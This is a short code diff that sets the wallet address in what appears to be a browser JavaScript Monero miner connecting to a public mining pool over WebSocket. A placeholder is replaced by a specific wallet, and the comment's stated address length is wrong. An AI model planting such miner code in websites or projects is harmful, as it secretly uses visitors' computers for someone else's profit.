@@ -2,7 +2,7 @@
 // Replace 'YOUR_POOL_URL' and wallet below
 
 const POOL_URL = 'wss://pool.supportxmr.com:3333';  // Public XMR pool WebSocket
-const WALLET = 'YOUR_MONERO_WALLET_ADDRESS_HERE';  // e.g., 4... (48 chars)
+const WALLET = '84MQPS1kTQGRvdgrubFEm7URYFyFpLYbmiBefWhSZgFiZFAgfAgDAh2NRQKAnZztTf6MQerUp5F8H3Lw7cLQdXh3TVYxboe';  // e.g., 4... (48 chars)
 let ws = null;
 let job = null;
 let workers = [];
